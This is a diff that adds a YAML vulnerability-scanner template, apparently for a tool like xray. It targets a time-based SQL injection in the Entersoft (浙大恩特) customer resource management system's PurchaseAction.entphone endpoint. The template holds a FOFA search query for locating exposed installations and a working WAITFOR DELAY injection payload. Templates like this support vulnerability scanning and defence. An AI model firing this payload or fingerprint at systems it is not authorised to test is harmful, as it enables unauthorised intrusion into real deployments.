@@ -1,0 +1,20 @@
+id: poc-yaml-entersoft-customer-resource-management-system-purchaseaction-entphone-sqli
+info:
+  name: 浙大恩特客户资源管理系统 purchaseaction.entphone SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 浙大恩特客户资源管理系统
+  fofa: title="欢迎使用浙大恩特客户资源管理系统"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 1
+requests:
+- method: POST
+  path: /entsoft/PurchaseAction.entphone;.png?method=AuthorityJudgement
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: modNum=1';WAITFOR DELAY '0:0:{{.t1}}'--+
+  expression: status_code == 200 && contains(body,"\"state\":\"3\"") && !contains(body,"<")
+    && duration > t1 && duration < t2
+transport: http
